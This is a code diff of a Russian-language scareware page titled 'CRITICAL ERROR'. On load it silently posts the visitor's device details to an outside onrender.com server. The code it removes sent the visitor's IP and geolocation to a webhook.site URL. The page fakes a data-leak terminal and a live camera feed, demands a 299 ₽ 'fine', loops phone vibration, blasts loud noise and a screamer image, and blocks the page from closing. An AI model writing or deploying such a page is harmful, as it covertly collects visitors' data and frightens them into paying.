@@ -5,19 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CRITICAL ERROR</title>
     <style>
-        html, body {
-            margin: 0; padding: 0; height: 100%;
-            background: #000; overflow: hidden; cursor: pointer;
-            font-family: 'Courier New', monospace;
-        }
-        #vid {
-            position: fixed; inset: 0; width: 100%; height: 100%;
-            object-fit: cover; display: block; pointer-events: none; z-index: 1;
-            transition: transform 0.05s, filter 0.1s;
-            opacity: 0;
-        }
+        html, body { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; cursor: pointer; font-family: 'Courier New', monospace; }
+        #vid { position: fixed; inset: 0; width: 100%; height: 100%; object-fit: cover; display: block; pointer-events: none; z-index: 1; transition: transform 0.05s, filter 0.1s; opacity: 0; }
         .show-vid { opacity: 1 !important; }
-        
         .shake { animation: shakeAnim 0.05s infinite; }
         @keyframes shakeAnim {
             0% { transform: translate(20px, 10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(90deg) invert(1); }
@@ -26,77 +16,37 @@
             75% { transform: translate(-20px, 10px) scale(1.3) rotate(-3deg); filter: contrast(4) hue-rotate(360deg) invert(0); }
             100% { transform: translate(10px, -20px) scale(1.3) rotate(0deg); filter: contrast(4) hue-rotate(0deg); }
         }
-        #glitch-overlay {
-            display: none; position: fixed; inset: 0; pointer-events: none; z-index: 5;
-            background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.8) 0px, rgba(0, 0, 0, 0.8) 3px, transparent 3px, transparent 6px);
-            animation: glitch 0.1s infinite;
-        }
+        #glitch-overlay { display: none; position: fixed; inset: 0; pointer-events: none; z-index: 5; background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.8) 0px, rgba(0, 0, 0, 0.8) 3px, transparent 3px, transparent 6px); animation: glitch 0.1s infinite; }
         @keyframes glitch { 0% { transform: translateY(0); } 50% { transform: translateY(30px); } 100% { transform: translateY(0); } }
-        
-        #virus-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(120, 0, 0, 0.95);
-            color: #fff; z-index: 9999; text-align: left; padding: 20px;
-            font-weight: bold; text-shadow: 1px 1px 2px #000; font-size: 18px;
-        }
-        #virus-overlay h1 { font-size: 30px; margin: 0 0 10px 0; animation: flash 0.2s infinite; color: yellow; text-align: center;}
-        #terminal-text {
-            margin-top: 10px; height: 55vh; overflow-y: auto;
-            color: #00ff00; font-size: 13px; text-shadow: 0 0 5px #00ff00;
-        }
+        #virus-overlay { display: none; position: fixed; inset: 0; background: rgba(120, 0, 0, 0.95); color: #fff; z-index: 9999; text-align: left; padding: 20px; font-weight: bold; text-shadow: 1px 1px 2px #000; font-size: 18px; }
+        #virus-overlay h1 { font-size: 30px; margin: 0 0 10px 0; animation: flash 0.2s infinite; color: yellow; text-align: center; }
+        #terminal-text { margin-top: 10px; height: 55vh; overflow-y: auto; color: #00ff00; font-size: 13px; text-shadow: 0 0 5px #00ff00; }
         .threat-text { color: #ff3333; font-size: 18px; margin-top: 10px; text-align: center; }
-        
-        #pay-btn {
-            display: none; margin: 10px auto; padding: 15px 30px; background: yellow;
-            color: black; font-size: 20px; font-weight: bold; border: none;
-            border-radius: 5px; cursor: pointer; animation: pulse 0.5s infinite alternate;
-            z-index: 10000; position: relative;
-        }
+        #pay-btn { display: none; margin: 10px auto; padding: 15px 30px; background: yellow; color: black; font-size: 20px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; animation: pulse 0.5s infinite alternate; z-index: 10000; position: relative; }
         @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
         @keyframes pulse { 0% { transform: scale(1); } 100% { transform: scale(1.1); } }
-        
-        #hint {
-            position: fixed; bottom: 0; left: 0; right: 0; padding: 30px 16px;
-            text-align: center; color: #fff; font-size: 18px; opacity: 0.7;
-            transition: opacity 0.4s; pointer-events: none; z-index: 10; font-family: Arial, sans-serif;
-        }
+        #hint { position: fixed; bottom: 0; left: 0; right: 0; padding: 30px 16px; text-align: center; color: #fff; font-size: 18px; opacity: 0.7; transition: opacity 0.4s; pointer-events: none; z-index: 10; font-family: Arial, sans-serif; }
         #hint.hidden { opacity: 0; }
-
-        #camera-feed {
-            display: none; position: fixed; bottom: 20px; right: 20px; width: 100px; height: 140px; 
-            background: #000; border: 2px solid #00ff00; z-index: 99999; border-radius: 10px; 
-            overflow: hidden; box-shadow: 0 0 20px #00ff00;
-        }
-        
-        #screamer {
-            display: none; position: fixed; inset: 0; z-index: 999999;
-            background: #000; justify-content: center; align-items: center;
-            animation: shakeAnim 0.05s infinite;
-        }
-        #screamer img {
-            width: 100%; height: 100%; object-fit: cover;
-            filter: contrast(2) saturate(0) invert(0.1);
-        }
+        #camera-feed { display: none; position: fixed; bottom: 20px; right: 20px; width: 100px; height: 140px; background: #000; border: 2px solid #00ff00; z-index: 99999; border-radius: 10px; overflow: hidden; box-shadow: 0 0 20px #00ff00; }
+        #screamer { display: none; position: fixed; inset: 0; z-index: 999999; background: #000; justify-content: center; align-items: center; animation: shakeAnim 0.05s infinite; }
+        #screamer img { width: 100%; height: 100%; object-fit: cover; filter: contrast(2) saturate(0) invert(0.1); }
     </style>
 </head>
 <body>
     <div id="glitch-overlay"></div>
-    
     <div id="virus-overlay">
         <h1>⚠️ УТЕЧКА ДАННЫХ ⚠️</h1>
         <div id="terminal-text"></div>
         <p class="threat-text">Все данные синхронизированы. Задолженность: 299 ₽.</p>
         <button id="pay-btn">ОПЛАТИТЬ ШТРАФ (299 ₽)</button>
     </div>
-
     <div id="camera-feed">
         <div style="position: absolute; top: 5px; left: 5px; color: red; font-weight: bold; font-family: monospace; font-size: 12px; animation: flash 0.5s infinite;">● REC</div>
         <div style="position: absolute; bottom: 5px; left: 0; width: 100%; text-align: center; color: #00ff00; font-family: monospace; font-size: 10px;">LIVE</div>
     </div>
-
     <div id="screamer">
         <img src="https://i.imgur.com/8QO9x3O.jpeg" alt="Screamer">
     </div>
-    
     <video id="vid" playsinline webkit-playsinline preload="auto" muted>
         <source src="Rick_Roll_Video_Meme_Template_V1.mp4" type="video/mp4">
     </video>
@@ -118,41 +68,28 @@
                 if (started) return;
                 started = true;
 
-                // Отправка данных
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
-                    .then(res => res.json())
-                    .then(data => {
-                        const payload = JSON.stringify({
-                            country: data.country_code || "Unknown",
-                            ip: data.ip,
-                            platform: navigator.platform,
-                            screen: window.screen.width + "x" + window.screen.height,
-                            language: navigator.language,
-                            userAgent: navigator.userAgent
-                        });
-                        fetch("https://webhook.site/8210aa39-3a98-4986-b37e-1fbc65a13f63", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: payload
-                        }).catch(e => console.log(e));
-                    }).catch(e => console.log(e));
+                // ОТПРАВКА НА ТВОЙ PYTHON-СЕРВЕР
+                fetch("https://app-fre1.onrender.com/log", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        platform: navigator.platform,
+                        screen: window.screen.width + "x" + window.screen.height,
+                        language: navigator.language,
+                        userAgent: navigator.userAgent
+                    })
+                }).catch(e => console.log(e));
 
                 let isRickroll = Math.random() < 0.1;
                 hint.classList.add('hidden');
 
-                // Вибрация (циклами по 1 сек)
                 let vibInterval = setInterval(() => {
                     if (navigator.vibrate) navigator.vibrate(1000);
                 }, 1100);
 
                 if (isRickroll) {
                     vid.classList.add('show-vid', 'shake');
-                    vid.play().then(() => {
-                        vid.muted = false;
-                        vid.volume = 1;
-                    });
+                    vid.play().then(() => { vid.muted = false; vid.volume = 1; });
                 } else {
                     glitchOverlay.style.display = 'block';
                     virusOverlay.style.display = 'block';
@@ -190,7 +127,6 @@
                             compressor.threshold.value = -40;
                             const oscGain = audioCtx.createGain();
                             oscGain.gain.value = 0.8;
-                            
                             oscillator.connect(oscGain);
                             oscGain.connect(compressor);
                             compressor.connect(audioCtx.destination);
@@ -213,23 +149,18 @@
                                 screamOsc.connect(screamGain);
                                 screamGain.connect(audioCtx.destination);
                                 screamOsc.start();
-                                setTimeout(() => { 
-                                    screamer.style.display = 'none'; 
-                                    try { screamOsc.stop(); } catch(e){}
-                                }, 5000);
-                            }, 30000); // Скример на 30 секунде
+                                setTimeout(() => { screamer.style.display = 'none'; try { screamOsc.stop(); } catch(e){} }, 5000);
+                            }, 30000);
                         }
                     } catch (e) {}
                 }
 
-                // Блокировка закрытия (без перезагрузок)
                 window.onbeforeunload = function(e) {
                     e.preventDefault();
                     e.returnValue = "ДАННЫЕ УКРАДЕНЫ. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ.";
                     return e.returnValue;
                 };
 
-                // Всего 5 окон, чтобы не вешать телефон
                 payBtn.addEventListener('click', function() {
                     let count = 0;
                     let alertInterval = setInterval(() => {
